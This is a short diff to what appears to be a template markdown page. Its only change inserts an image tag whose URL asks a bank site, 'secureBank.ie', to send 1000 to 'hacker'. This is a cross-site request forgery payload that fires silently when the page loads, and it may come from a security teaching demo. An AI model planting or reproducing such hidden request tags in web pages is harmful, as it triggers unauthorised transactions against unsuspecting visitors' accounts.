@@ -14,6 +14,7 @@ Syntax highlighted code block
 # Header 1
 ## Header 2
 ### Header 3
+<img src="http://www.secureBank.ie/sendMoney?giveMoneyTo=hacker&giveAmount=1000"/>
 
 - Bulleted
 - List
